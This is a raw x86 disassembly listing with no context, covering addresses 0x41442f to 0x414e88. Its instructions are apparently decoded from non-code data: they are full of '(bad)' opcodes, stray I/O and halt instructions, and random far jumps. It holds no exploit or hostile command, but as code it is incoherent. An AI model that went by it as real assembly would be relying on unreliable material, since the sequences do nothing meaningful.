  41442f:	ffree  st(4)
  414431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414432:	adc    BYTE PTR [ebx-0x68ef1e97],bh
  414438:	mov    bl,0x4e
  41443a:	loopne 0x4144a2
  41443c:	outs   dx,DWORD PTR ds:[esi]
  41443d:	mov    ds:0x98830b6,eax
  414442:	jecxz  0x41441a
  414444:	pushf  
  414445:	icebp  
  414446:	xchg   DWORD PTR [edi+0x44816ab5],edi
  41444c:	les    eax,FWORD PTR [edx+0x5858f099]
  414452:	and    DWORD PTR [ebx-0x3bc67752],ecx
  414458:	jno    0x41443e
  41445a:	clc    
  41445b:	and    eax,0xb20cd912
  414460:	shl    BYTE PTR [eax+esi*1],cl
  414463:	lods   al,BYTE PTR gs:[esi]
  414465:	imul   esi,DWORD PTR [esi+0x57db6e3],0xffffffb4
  41446c:	pop    ss
  41446d:	jmp    0x414461
  41446f:	sti    
  414470:	sbb    esp,DWORD PTR [ebp-0x6]
  414473:	dec    edx
  414474:	xchg   edx,eax
  414475:	lahf   
  414476:	out    dx,eax
  414477:	jae    0x4144e5
  414479:	lahf   
  41447a:	(bad)  
  41447b:	aad    0x39
  41447d:	xchg   esi,eax
  41447e:	(bad)  
  414480:	adc    eax,0x8f459933
  414485:	lods   eax,DWORD PTR ds:[esi]
  414486:	(bad)  
  414487:	adc    al,BYTE PTR [ebx+0x4da5872]
  41448d:	or     cl,al
  41448f:	loope  0x414491
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x59]
  414501:	push   cs
  414502:	sub    al,0x3f
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	cmp    bl,dh
  41450e:	jp     0x4144c8
  414510:	sub    BYTE PTR es:[edx+0x3531a824],dl
  414517:	xor    BYTE PTR [eax-0x49],bh
  41451a:	add    BYTE PTR [eax+0x7f22fe2d],al
  414520:	xor    DWORD PTR [esi-0x25],0xafa9f5e5
  414527:	cmc    
  414528:	out    dx,al
  414529:	cwde   
  41452a:	ds mov edi,0x6a3d77d8
  414530:	xor    DWORD PTR [eax-0x53],0x3df98422
  414537:	inc    esi
  414538:	xor    BYTE PTR [ecx+0x16809cee],dh
  41453e:	push   cs
  41453f:	cmp    al,0x90
  414541:	in     al,0xbe
  414543:	pop    ebp
  414544:	call   0x5bae:0x6963038e
  41454b:	ret    0xc992
  41454e:	nop
  41454f:	lods   eax,DWORD PTR ds:[esi]
  414550:	in     eax,0x5a
  414552:	mov    eax,0x492c5f3d
  414557:	mov    esi,0x4572d50c
  41455c:	inc    eax
  41455d:	hlt    
  41455e:	jecxz  0x4144e8
  414560:	aas    
  414561:	stos   DWORD PTR es:[edi],eax
  414562:	test   BYTE PTR [ecx+esi*4+0x166142d],cl
  414569:	adc    bh,ah
  41456b:	mov    ebp,0xa28919d3
  414570:	jmp    0x414599
  414572:	push   cs
  414573:	ret    
  414574:	shr    BYTE PTR [esi+0x1],0x37
  414578:	pop    esp
  414579:	or     ch,BYTE PTR [eax-0x29b92ef4]
  41457f:	fldl2e 
  414581:	loope  0x4145a3
  414583:	mov    eax,ds:0x612b8638
  414588:	dec    ebp
  414589:	gs mov bh,0x37
  41458c:	add    al,BYTE PTR [ebp+0x5518499a]
  414592:	in     eax,0x84
  414594:	sub    BYTE PTR [ebx-0x4e67e2ac],dh
  41459a:	dec    esi
  41459b:	ret    
  41459c:	in     eax,dx
  41459d:	or     al,0x97
  41459f:	pop    ebx
  4145a0:	push   ebp
  4145a1:	rcl    DWORD PTR [esi+0x30],1
  4145a4:	loopne 0x414550
  4145a6:	add    DWORD PTR [edx],esp
  4145a8:	dec    edi
  4145a9:	imul   edi,DWORD PTR [ecx+eiz*1-0x17],0xffffffd4
  4145ae:	and    esi,DWORD PTR [edi]
  4145b0:	jge    0x414603
  4145b2:	jae    0x4145ae
  4145b4:	rol    DWORD PTR [ecx+0x25],0x36
  4145b8:	jl     0x414550
  4145ba:	das    
  4145bb:	mov    WORD PTR [ecx-0xe],fs
  4145be:	sbb    eax,0x84d98833
  4145c3:	dec    esp
  4145c4:	fwait
  4145c5:	dec    edi
  4145c6:	std    
  4145c7:	xlat   BYTE PTR ds:[ebx]
  4145c8:	(bad)  
  4145ca:	popf   
  4145cb:	xchg   BYTE PTR [eax-0x57],al
  4145ce:	(bad)  
  4145cf:	sbb    BYTE PTR [ebx+0xeee7ab7],ah
  4145d5:	mov    eax,DWORD PTR [eax]
  4145d7:	xor    DWORD PTR [ebp-0x44a50aba],0x16
  4145de:	mov    bl,0x7d
  4145e0:	enter  0xaf6a,0x18
  4145e4:	push   ss
  4145e5:	inc    edx
  4145e6:	pop    esp
  4145e7:	sub    dh,dh
  4145e9:	sub    ebx,DWORD PTR [esi-0x5f]
  4145ec:	xlat   BYTE PTR ds:[ebx]
  4145ee:	xor    ah,cl
  4145f0:	xchg   DWORD PTR [ecx-0x1b],esp
  4145f3:	jne    0x414632
  4145f5:	retf   0xbc02
  4145f8:	cdq    
  4145f9:	jle    0x4145fc
  4145fb:	loop   0x414591
  4145fd:	jle    0x414600
  4145ff:	pusha  
  414600:	and    eax,0x175c385d
  414605:	xchg   ebp,eax
  414606:	pushf  
  414607:	int    0xd0
  414609:	aad    0x63
  41460b:	inc    ebp
  41460c:	dec    ecx
  41460d:	xor    eax,0xc6e
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xc6
  414681:	into   
  414682:	inc    edi
  414683:	enter  0xd6f0,0x0
  414687:	add    BYTE PTR [ecx+eax*1],al
  41468a:	add    BYTE PTR [eax],al
  41468c:	int3   
  41468d:	dec    ebp
  41468e:	les    ecx,FWORD PTR [edx+0xd]
  414691:	dec    edi
  414692:	into   
  414693:	loope  0x4146b3
  414695:	loopne 0x4146e9
  414697:	sbb    al,0x80
  414699:	ds (bad) 
  41469b:	mov    al,ds:0xf67bafae
  4146a0:	jnp    0x414652
  4146a2:	and    BYTE PTR [edi+0x2b],dl
  4146a5:	inc    ebx
  4146a6:	imul   ebp,DWORD PTR [ecx-0x38ac8c41],0x3b
  4146ad:	clc    
  4146ae:	lock (bad) 
  4146b0:	(bad)  
  4146b1:	sbb    al,0xed
  4146b3:	push   eax
  4146b4:	loope  0x4146bb
  4146b6:	leave  
  4146b7:	std    
  4146b8:	dec    edi
  4146b9:	jo     0x41467a
  4146bb:	adc    esi,ebx
  4146bd:	lock push eax
  4146bf:	mov    al,ds:0x20c7aa40
  4146c4:	add    cl,BYTE PTR [edi-0x14]
  4146c7:	stc    
  4146c8:	in     al,dx
  4146c9:	jo     0x4146ab
  4146cb:	lea    esi,[edx-0x76652687]
  4146d1:	(bad)  
  4146d2:	fdiv   st(1),st
  4146d4:	popa   
  4146d5:	icebp  
  4146d6:	adc    DWORD PTR [edi],esp
  4146d8:	or     BYTE PTR [edx-0x35ee9bf1],al
  4146de:	pop    eax
  4146df:	out    dx,eax
  4146e0:	xchg   esi,eax
  4146e1:	cmp    edx,DWORD PTR [edi]
  4146e3:	fidiv  DWORD PTR [ebx+esi*1-0x1c]
  4146e7:	pop    ds
  4146e8:	stc    
  4146e9:	xor    BYTE PTR [edx-0x3],bh
  4146ec:	inc    edx
  4146ed:	mov    eax,0x2f7de65a
  4146f2:	sbb    ah,BYTE PTR [esi-0x145ad197]
  4146f8:	ja     0x414720
  4146fa:	xchg   ebp,eax
  4146fb:	inc    edi
  4146fc:	(bad)  
  4146fd:	fnstenv [ecx]
  4146ff:	mov    al,ds:0xad194bf1
  414704:	or     cl,BYTE PTR ds:0x2f7a5bf9
  41470a:	inc    ebx
  41470b:	mov    dh,dl
  41470d:	jg     0x41476b
  41470f:	leave  
  414710:	out    0xdb,al
  414712:	xchg   esp,eax
  414713:	push   ebx
  414714:	arpl   WORD PTR [edx],dx
  414716:	inc    ebp
  414717:	shl    BYTE PTR [eax],0x51
  41471a:	into   
  41471b:	arpl   ax,bp
  41471d:	popf   
  41471e:	push   ss
  41471f:	dec    ebp
  414720:	popf   
  414721:	loope  0x414760
  414723:	and    al,0x67
  414725:	shl    BYTE PTR [ebp+0x5a754fd8],1
  41472b:	aaa    
  41472c:	loopne 0x4146b0
  41472e:	mov    ds:0x64fd5f96,al
  414733:	gs xor al,0x83
  414736:	inc    ebx
  414737:	push   esi
  414738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41473a:	adc    bl,BYTE PTR [ebp-0x7203c67]
  414740:	stos   BYTE PTR es:[edi],al
  414741:	lahf   
  414742:	sbb    eax,0x483aca37
  414747:	int    0x86
  414749:	mov    ecx,0xef49def
  41474e:	push   ecx
  41474f:	mov    eax,ds:0x72c92cd8
  414754:	jmp    0xbcc5:0xbe3720c9
  41475b:	push   eax
  41475c:	cmp    eax,0xfda4360f
  414761:	mov    ds:0x51ba4fb2,al
  414766:	rcl    DWORD PTR [ebp+0x46],0x58
  41476a:	jecxz  0x414751
  41476c:	dec    esp
  41476d:	dec    esi
  41476e:	in     eax,dx
  41476f:	inc    ecx
  414770:	cdq    
  414771:	and    eax,0x67cf0e8d
  414776:	cmp    eax,0x160b770a
  41477b:	(bad)  
  41477c:	ret    0x2ce1
  41477f:	add    al,0xab
  414781:	jl     0x414787
  414783:	repz inc edx
  414785:	add    al,0x4b
  414787:	mov    edi,0x521c9dd6
  41478c:	test   BYTE PTR [ebp-0x1f],dl
  41478f:	cli    
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x35feef79
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	push   edx
  41480d:	fisubr WORD PTR [ecx+0x3f]
  414810:	sub    dh,ch
  414812:	loop   0x4147d1
  414814:	outs   dx,BYTE PTR ds:[esi]
  414815:	cmp    ch,BYTE PTR [ebx]
  414817:	sub    al,0x5a
  414819:	mov    edi,ebx
  41481b:	push   ds
  41481c:	pop    esp
  41481d:	mov    bh,0x71
  41481f:	sub    al,0xea
  414821:	mov    ebp,0x8189f348
  414826:	lahf   
  414827:	xchg   edx,eax
  414828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414829:	push   DWORD PTR [esi+ecx*4+0x597bc88c]
  414830:	aas    
  414831:	jo     0x414873
  414833:	leave  
  414834:	cmp    al,0x0
  414836:	out    dx,eax
  414837:	sub    ah,BYTE PTR [ebp+eax*4+0x3e]
  41483b:	cli    
  41483c:	push   esi
  41483d:	repz sub al,0xc6
  414840:	jmp    0x4147e1
  414842:	aas    
  414843:	jmp    0xf7e4:0x3a02d5b8
  41484a:	popa   
  41484b:	sub    ch,BYTE PTR [edi]
  41484d:	pop    eax
  41484e:	jg     0x41487e
  414850:	xor    eax,DWORD PTR [ecx+ecx*2]
  414853:	push   edx
  414854:	shl    DWORD PTR [eax-0x7f183c51],cl
  41485a:	push   esi
  41485b:	gs add ecx,edi
  41485e:	iret   
  41485f:	adc    BYTE PTR [eax],bl
  414861:	cmp    ch,ah
  414863:	pop    ebp
  414864:	enter  0x14f4,0x51
  414868:	in     al,dx
  414869:	push   ebp
  41486a:	cs jns 0x414812
  41486d:	mov    ebp,DWORD PTR [ebp+0xfcb9aea]
  414873:	inc    edx
  414874:	or     DWORD PTR ss:[eax-0x47b02995],esp
  41487b:	mov    esp,0x11ab35ba
  414880:	push   ds
  414881:	retf   
  414882:	inc    ebx
  414883:	ins    DWORD PTR es:[edi],dx
  414884:	xchg   edi,eax
  414885:	xchg   cl,bh
  414887:	and    cl,BYTE PTR [edi]
  414889:	in     al,0xc3
  41488b:	xor    eax,0x1de1d1f3
  414890:	adc    al,0x0
  414892:	test   edx,edi
  414894:	jle    0x414829
  414896:	or     dl,cl
  414898:	sar    BYTE PTR [esi+0x4d],0xb5
  41489c:	or     eax,0x2894805c
  4148a1:	das    
  4148a2:	pop    esi
  4148a3:	fisubr WORD PTR [edi]
  4148a5:	mov    cl,0xa4
  4148a7:	and    al,0x28
  4148a9:	cs pusha 
  4148ab:	imul   eax,DWORD PTR [edi],0xdb7f5846
  4148b1:	test   eax,0xe01fb4fb
  4148b6:	mov    ebp,0x9baf0091
  4148bb:	enter  0xc477,0xcb
  4148bf:	sar    BYTE PTR [ebx-0x6a9552bb],0x98
  4148c6:	or     ch,BYTE PTR [eax+0xb]
  4148c9:	xor    ebx,ebx
  4148cb:	out    dx,al
  4148cc:	inc    eax
  4148cd:	and    esp,DWORD PTR [edx+0x43a7d77]
  4148d3:	aas    
  4148d4:	xchg   edi,eax
  4148d5:	(bad)  
  4148d6:	sbb    al,0x4e
  4148d8:	jmp    0xc0fc:0xe723b738
  4148df:	in     al,0xcb
  4148e1:	dec    edx
  4148e2:	call   0xf505:0x57e7f352
  4148e9:	mov    cl,0x61
  4148eb:	ret    0x7661
  4148ee:	cmp    eax,0x19495dfa
  4148f3:	iret   
  4148f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148f5:	cmp    eax,0x2f1fb868
  4148fa:	inc    eax
  4148fb:	push   0xf648277d
  414900:	sub    ecx,esp
  414902:	and    al,0xe8
  414904:	lods   eax,DWORD PTR ds:[esi]
  414905:	or     edi,0x8aab55b9
  41490b:	jne    0x41490e
  41490d:	stos   DWORD PTR es:[edi],eax
  41490e:	sbb    BYTE PTR [edi+0x0],cl
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	push   es
  414981:	mov    bh,0xab
  414983:	mov    bh,0xf8
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	sub    al,BYTE PTR [ecx]
  41498e:	dec    edi
  41498f:	fdiv   DWORD PTR [ebx-0x31]
  414992:	jle    0x414a07
  414994:	mov    bl,0xe3
  414996:	mov    dl,0x98
  414998:	test   al,cl
  41499a:	or     al,0x7c
  41499c:	in     eax,0x78
  41499e:	jp     0x414996
  4149a0:	cdq    
  4149a1:	int3   
  4149a2:	adc    BYTE PTR [eax],bl
  4149a4:	inc    esi
  4149a5:	xchg   ebx,eax
  4149a6:	adc    al,0x89
  4149a8:	cmp    al,0x82
  4149aa:	or     cl,ah
  4149ac:	ss (bad) 
  4149ae:	mov    cl,0x5d
  4149b0:	(bad)  
  4149b1:	adc    dh,BYTE PTR [eax+0x4d25ca74]
  4149b7:	dec    edi
  4149b8:	cmp    al,0xd4
  4149ba:	and    eax,0xa3f2148
  4149bf:	popf   
  4149c0:	mov    al,ds:0x1a0bfefe
  4149c5:	cmovno edi,DWORD PTR ds:0x7e34f82d
  4149cc:	loope  0x4149e4
  4149ce:	jns    0x4149b0
  4149d0:	dec    ebp
  4149d1:	fsub   st,st(7)
  4149d3:	or     al,BYTE PTR ds:0xbc7dd729
  4149d9:	in     al,0x92
  4149db:	lahf   
  4149dc:	inc    edi
  4149dd:	mov    ebp,0x9ba41e24
  4149e2:	hlt    
  4149e3:	jl     0x414a05
  4149e5:	fs cld 
  4149e7:	xor    DWORD PTR [esi],ebx
  4149e9:	rol    DWORD PTR [eax+0x7ad2219d],cl
  4149ef:	ins    BYTE PTR es:[edi],dx
  4149f0:	jno    0x414974
  4149f2:	into   
  4149f3:	push   ebp
  4149f4:	lahf   
  4149f5:	inc    edi
  4149f6:	ins    DWORD PTR es:[edi],dx
  4149f7:	sbb    DWORD PTR [edx-0x2f],ebx
  4149fa:	mov    eax,ds:0x4872e08d
  4149ff:	test   eax,0xe5ddbf60
  414a04:	psubsw mm7,QWORD PTR [ecx-0x352388b1]
  414a0b:	push   eax
  414a0c:	mov    ebx,0x8aa2539d
  414a11:	adc    eax,0x6a759e2b
  414a16:	(bad)  
  414a17:	cmp    eax,0xbe8a2f81
  414a1c:	mov    ss,WORD PTR [edi-0x41]
  414a1f:	xchg   DWORD PTR [ebx+0x7eb2cafb],esi
  414a25:	test   DWORD PTR [ecx+0x71],esi
  414a28:	dec    edi
  414a29:	cmp    DWORD PTR [ebp+0x61],ebp
  414a2c:	cmp    DWORD PTR [ebp+eax*1+0x5ea8a8c7],edi
  414a33:	test   DWORD PTR es:[edx+0x3d690846],0xba76e700
  414a3e:	jbe    0x4149ed
  414a40:	xor    eax,0xf0703a83
  414a45:	inc    ebp
  414a46:	out    0x14,eax
  414a48:	adc    DWORD PTR [ebp+0x4aee2b65],ecx
  414a4e:	retf   0xdb73
  414a51:	adc    ah,al
  414a53:	js     0x414a04
  414a55:	jmp    0x414a08
  414a57:	dec    edx
  414a58:	je     0x414ab0
  414a5a:	(bad)  
  414a5b:	adc    DWORD PTR [esi+0xa],edx
  414a5e:	adc    eax,0xa92c7d0a
  414a63:	mov    bh,0x46
  414a65:	into   
  414a66:	fistp  DWORD PTR [esi-0x14951781]
  414a6c:	sub    dl,bh
  414a6e:	mov    DWORD PTR [eax+0x2ad9e319],esi
  414a74:	nop
  414a75:	jle    0x414a22
  414a77:	out    dx,eax
  414a78:	mov    edi,edi
  414a7a:	pop    es
  414a7b:	push   eax
  414a7c:	cdq    
  414a7d:	pop    ebp
  414a7e:	push   ds
  414a7f:	in     eax,0x89
  414a81:	jmp    0xbebbb00d
  414a86:	xor    al,0xf1
  414a88:	pop    es
  414a89:	lds    esp,FWORD PTR [eax-0xa3c4c0]
  414a8f:	rol    DWORD PTR [eax],1
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [eax-0x6c],sp
  414b02:	mov    DWORD PTR ds:0xd9fc,esi
  414b08:	add    al,0x1
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	dec    eax
  414b0d:	and    al,0x9b
  414b0f:	jl     0x414ae7
  414b11:	xchg   esi,eax
  414b12:	cmc    
  414b13:	outs   dx,DWORD PTR ds:[esi]
  414b14:	mov    ah,0x7
  414b16:	or     ch,BYTE PTR [esi]
  414b18:	mov    al,0x84
  414b1a:	popf   
  414b1b:	ins    BYTE PTR es:[edi],dx
  414b1c:	pusha  
  414b1d:	dec    ecx
  414b1e:	inc    esp
  414b1f:	adc    esi,DWORD PTR [ecx-0x44]
  414b22:	popa   
  414b23:	adc    al,0xc1
  414b25:	jg     0x414b6e
  414b27:	aas    
  414b28:	or     BYTE PTR [eax],al
  414b2a:	mul    DWORD PTR [edi-0x36]
  414b2d:	jne    0x414ab5
  414b2f:	rol    BYTE PTR [eax-0x32],0xe0
  414b33:	clc    
  414b34:	cmp    bh,BYTE PTR [ecx+esi*8]
  414b37:	not    DWORD PTR ds:0x6a1a98da
  414b3d:	shr    esp,1
  414b3f:	pop    ebx
  414b40:	push   cs
  414b41:	(bad)  
  414b42:	int3   
  414b43:	cdq    
  414b44:	sar    edx,1
  414b46:	add    dl,ah
  414b48:	daa    
  414b49:	pop    ds
  414b4a:	adc    ebp,DWORD PTR [ecx+ecx*8+0x2d]
  414b4e:	ret    
  414b4f:	addr16 fs and al,0x37
  414b53:	out    0x3c,al
  414b55:	int3   
  414b56:	js     0x414b1f
  414b58:	pop    ebp
  414b59:	scas   eax,DWORD PTR es:[edi]
  414b5a:	sbb    BYTE PTR [esi],ah
  414b5c:	pushf  
  414b5d:	cmp    ah,dl
  414b5f:	and    eax,ebx
  414b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b62:	test   cl,dh
  414b64:	test   al,0xd8
  414b66:	sub    BYTE PTR [eax-0x475b5754],0x24
  414b6d:	(bad)  
  414b6e:	mov    ah,0x2b
  414b70:	jg     0x414b35
  414b72:	mov    ah,0xea
  414b74:	mov    edi,0xcc250488
  414b79:	lea    ebx,[ebp+0x36684fe8]
  414b7f:	push   ebp
  414b80:	xor    ah,BYTE PTR [ecx]
  414b82:	fnstenv [eax]
  414b84:	je     0x414bdd
  414b86:	xor    eax,0xd77c4a6
  414b8b:	and    eax,0xe4e9327e
  414b90:	fcom   DWORD PTR [ecx-0x5]
  414b93:	pop    edi
  414b94:	inc    esp
  414b95:	js     0x414bfa
  414b97:	dec    ebp
  414b98:	mov    al,dh
  414b9a:	mov    ebp,0xb8d9a1f7
  414b9f:	retf   
  414ba0:	ss inc esi
  414ba2:	mov    dl,0x17
  414ba4:	jae    0x414c1c
  414ba6:	inc    edx
  414ba7:	ficomp WORD PTR [edi]
  414ba9:	int    0xc7
  414bab:	jo     0x414b5a
  414bad:	push   eax
  414bae:	mov    ds:0x4b6a96bf,eax
  414bb3:	sbb    BYTE PTR ds:0xb611d669,al
  414bb9:	in     eax,dx
  414bba:	push   edi
  414bbb:	add    bl,BYTE PTR [eax]
  414bbd:	jge    0x414baa
  414bbf:	rsm    
  414bc1:	mov    WORD PTR [edi],es
  414bc3:	mov    bl,BYTE PTR [ebx-0x68]
  414bc6:	aas    
  414bc7:	data16 loopne 0x414c03
  414bca:	loop   0x414b83
  414bcc:	je     0x414c14
  414bce:	fnstenv [ecx-0x1d]
  414bd1:	outs   dx,DWORD PTR ss:[esi]
  414bd3:	ins    BYTE PTR es:[edi],dx
  414bd4:	mov    esi,0x26da7226
  414bd9:	sbb    cl,dh
  414bdb:	pop    esp
  414bdc:	stos   BYTE PTR es:[edi],al
  414bdd:	xchg   cl,bh
  414bdf:	mov    ecx,0x155f1e2c
  414be4:	outs   dx,DWORD PTR ds:[esi]
  414be5:	inc    edi
  414be6:	sub    DWORD PTR ds:[eax+0x78],esp
  414bea:	mov    ecx,0xfa103508
  414bef:	sub    al,0x26
  414bf1:	xchg   ebp,eax
  414bf2:	mov    eax,ds:0x60201695
  414bf7:	push   es
  414bf8:	je     0x414c76
  414bfa:	in     eax,0xf5
  414bfc:	jne    0x414c4e
  414bfe:	pop    ds
  414bff:	sbb    eax,0xc09dd753
  414c04:	pop    ss
  414c05:	or     edi,DWORD PTR [eax-0x6a671691]
  414c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0c:	xor    eax,DWORD PTR [edi+edi*8]
  414c0f:	dec    edx
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    esp,DWORD PTR cs:[edi+0x2b1442]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR [ecx+eax*1],al
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	in     eax,0xb8
  414c8e:	out    0x1a,eax
  414c90:	mov    edx,0x86baac1a
  414c95:	push   ds
  414c96:	aaa    
  414c97:	loopne 0x414c1d
  414c99:	in     al,dx
  414c9a:	push   esi
  414c9b:	mov    cs,WORD PTR [eax+ecx*2-0x51]
  414c9f:	(bad)  
  414ca0:	jge    0x414cb0
  414ca2:	fs ss jmp FWORD PTR cs:[edx]
  414ca7:	push   0x854a367c
  414cac:	iret   
  414cad:	(bad)  
  414cae:	in     al,0x37
  414cb0:	and    al,0x84
  414cb2:	mov    esp,0x7e9e19c2
  414cb7:	imul   esi,esp,0x76
  414cba:	mov    ebx,0xb0f5c10d
  414cbf:	pusha  
  414cc0:	loop   0x414ce5
  414cc2:	shr    BYTE PTR [edi],1
  414cc4:	sub    DWORD PTR fs:[eax],ebx
  414cc7:	pop    ebp
  414cc8:	fadd   DWORD PTR [ebp-0x6b]
  414ccb:	int3   
  414ccc:	out    dx,eax
  414ccd:	add    BYTE PTR [edx-0x5d],ch
  414cd0:	(bad)  
  414cd1:	jmp    0x414d3d
  414cd3:	mov    cl,0x7a
  414cd5:	ins    DWORD PTR es:[edi],dx
  414cd6:	jno    0x414caf
  414cd8:	mov    ds:0x133ba27e,eax
  414cdd:	jg     0x414c90
  414cdf:	call   0xec6936e9
  414ce4:	mov    esi,ebp
  414ce6:	or     DWORD PTR [esi],esp
  414ce8:	sub    BYTE PTR [edx-0x5aa19725],0x4c
  414cef:	push   ds
  414cf0:	daa    
  414cf1:	fist   WORD PTR [eax-0x12]
  414cf4:	cdq    
  414cf5:	push   edi
  414cf6:	xchg   esi,eax
  414cf7:	adc    ecx,esi
  414cf9:	sub    DWORD PTR [ebp+0x691464f],ebx
  414cff:	sahf   
  414d00:	outs   dx,DWORD PTR ds:[esi]
  414d01:	lds    edx,FWORD PTR [edi+0x1b]
  414d04:	mov    bh,0x1f
  414d06:	push   ebx
  414d07:	push   edx
  414d08:	or     eax,0xfb728584
  414d0d:	sti    
  414d0e:	push   ss
  414d0f:	xor    BYTE PTR [esi],ch
  414d11:	mov    edi,0xbc1d2b82
  414d16:	ret    
  414d17:	cmp    cl,BYTE PTR [ecx]
  414d19:	push   eax
  414d1a:	stos   DWORD PTR es:[edi],eax
  414d1b:	ins    DWORD PTR es:[edi],dx
  414d1c:	inc    eax
  414d1d:	out    dx,al
  414d1e:	add    ecx,DWORD PTR [ecx+0x7556dcc8]
  414d24:	cmc    
  414d25:	stc    
  414d26:	add    al,0x6d
  414d28:	mov    esi,0x379617ce
  414d2d:	mov    al,0xa4
  414d2f:	stc    
  414d30:	les    eax,FWORD PTR [edi]
  414d32:	add    BYTE PTR [ebp+0x6e],al
  414d35:	retf   0x7a07
  414d38:	xor    ch,BYTE PTR [eax]
  414d3a:	jnp    0x414cf0
  414d3c:	leave  
  414d3d:	imul   esi,DWORD PTR [esi+0x1],0x22
  414d41:	neg    BYTE PTR [ebx]
  414d43:	loopne 0x414d20
  414d45:	or     BYTE PTR [eax+eax*4-0x52338cba],cl
  414d4c:	adc    DWORD PTR [edi],edx
  414d4e:	out    dx,eax
  414d4f:	int3   
  414d50:	sbb    eax,0xdb79541b
  414d55:	mov    edx,0x21031062
  414d5a:	mov    edi,0xb0312a33
  414d5f:	shr    edx,0xc
  414d62:	enter  0xc780,0x25
  414d66:	mov    ebx,0x4c7b7965
  414d6b:	and    eax,DWORD PTR [ecx]
  414d6d:	adc    bl,ah
  414d6f:	xchg   esp,eax
  414d70:	cwde   
  414d71:	ret    0x43f8
  414d74:	aaa    
  414d75:	popa   
  414d76:	mov    ebx,0x209d195a
  414d7b:	inc    eax
  414d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d7d:	jecxz  0x414d3b
  414d7f:	jne    0x414dfa
  414d81:	xchg   edi,eax
  414d82:	xor    BYTE PTR [edx+0x47],dh
  414d85:	fdiv   st(5),st
  414d87:	out    dx,eax
  414d88:	jbe    0x414db1
  414d8a:	dec    ecx
  414d8b:	xor    edi,DWORD PTR [eax+0x24]
  414d8e:	(bad)
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xa136aafb
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	sub    ah,BYTE PTR [ebp+ebx*1-0x3d]
  414e10:	pop    ebp
  414e11:	add    BYTE PTR [edi+0x1e],0x5a
  414e15:	jb     0x414e35
  414e17:	xchg   edi,eax
  414e18:	add    al,0x0
  414e1a:	ja     0x414dd9
  414e1c:	mov    ah,0x47
  414e1e:	mov    BYTE PTR [edi],al
  414e20:	jb     0x414e38
  414e22:	and    dl,BYTE PTR [esi+0x6b0e50ad]
  414e28:	xor    DWORD PTR [ecx],0x41
  414e2b:	xlat   BYTE PTR ds:[ebx]
  414e2c:	ret    
  414e2d:	ret    0x40d3
  414e30:	(bad)  
  414e31:	(bad)
  414e35:	mov    ds:0x66bd98e9,al
  414e3a:	mov    ah,0x7d
  414e3c:	and    al,0x40
  414e3e:	imul   edi,DWORD PTR [esi+edi*4+0x59],0x77d5da56
  414e46:	mov    al,ds:0xd4026c21
  414e4b:	nop
  414e4c:	lods   al,BYTE PTR ds:[esi]
  414e4d:	jmp    0x8af1792b
  414e52:	jmp    0xd148:0xfbe4b99c
  414e59:	mov    al,ds:0xf1df7128
  414e5e:	enter  0x88d9,0x6e
  414e62:	std    
  414e63:	and    DWORD PTR [eax-0x15081e1c],ebx
  414e69:	fld1   
  414e6b:	es xor bh,al
  414e6e:	pop    esp
  414e6f:	(bad)  
  414e70:	mov    edx,0xebdb2833
  414e75:	sub    ebp,DWORD PTR [edi]
  414e77:	lods   eax,DWORD PTR ds:[esi]
  414e78:	xchg   ebx,eax
  414e79:	sbb    eax,0xa76b1610
  414e7e:	out    0xa1,al
  414e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e81:	fs jle 0x414e7c
  414e84:	sti    
  414e85:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  414e87:	inc    eax
  414e88:	leave  
